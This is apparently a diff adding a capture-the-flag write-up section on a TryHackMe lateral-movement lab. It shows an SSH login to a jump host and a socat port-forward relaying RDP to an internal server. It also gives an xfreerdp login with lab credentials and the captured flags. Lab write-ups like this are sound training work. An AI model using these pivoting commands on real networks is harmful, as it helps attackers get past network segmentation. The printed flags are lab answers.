@@ -1292,3 +1292,47 @@ According to the command output above, if we were currently connected via RDP us
 - Retrieve the flag from inside the hijacked session.
   # Paint loads and has same images as on desktop a command can simply load image and     make that image the wallpaper THM{NICE_WALLPAPER}
   
+##  Task 8
+
+First ssh into the thmjmp2 server.                                 
+```
+ssh za\\roger.baxter@thmjmp2.za.tryhackme.com
+```
+# Go to socat diretory
+```
+za\roger.baxter@THMJMP2 c:\tools\socat>dir                                  
+ Volume in drive C has no label.                                            
+ Volume Serial Number is F4B0-FCB9                                          
+                                                                            
+ Directory of c:\tools\socat                                                
+                                                                            
+06/19/2022  05:38 AM    <DIR>          .                                    
+06/19/2022  05:38 AM    <DIR>          ..                                   
+07/22/2016  09:28 AM             6,279 COPYING.OpenSSL.txt                  
+01/07/2017  08:28 AM            18,092 COPYING.txt                          
+07/23/2018  12:15 PM         3,224,328 msys-2.0.dll                         
+07/23/2018  12:15 PM         2,256,928 msys-crypto-1.0.0.dll                
+07/23/2018  12:15 PM           338,184 msys-ncursesw6.dll                   
+07/23/2018  12:15 PM           243,464 msys-readline7.dll                   
+07/23/2018  12:15 PM           421,920 msys-ssl-1.0.0.dll                   
+07/23/2018  12:15 PM            99,440 msys-z.dll                           
+01/07/2017  08:28 AM            11,646 README.txt                           
+07/23/2018  12:15 PM           305,080 socat.exe                            
+              10 File(s)      6,925,361 bytes                               
+               2 Dir(s)   7,848,947,712 bytes free                          
+```
+# socat present next use it create tunnel 
+```
+C:\tools\socat\socat TCP4-LISTEN:15555,fork TCP4:THMIIS.za.tryhackme.com:3389
+```
+# if working just get cursor on line waiting
+#Then use it to RDP into target host
+```
+xfreerdp /v:thmjmp2.za.tryhackme.com:15555 /u:t1_thomas.moore /p:MyPazzw3rd2020
+```
+#should get desktop with flag.exe
+```
+C:\Users\t1_thomas.moore\Destkop\flag.exe
+THM{SIGHT_BEYOND_SIGHT}
+```
+NEXT same for THMDC using the Rejetto exploit on THMDC using the Rejetto HFS exploit. 
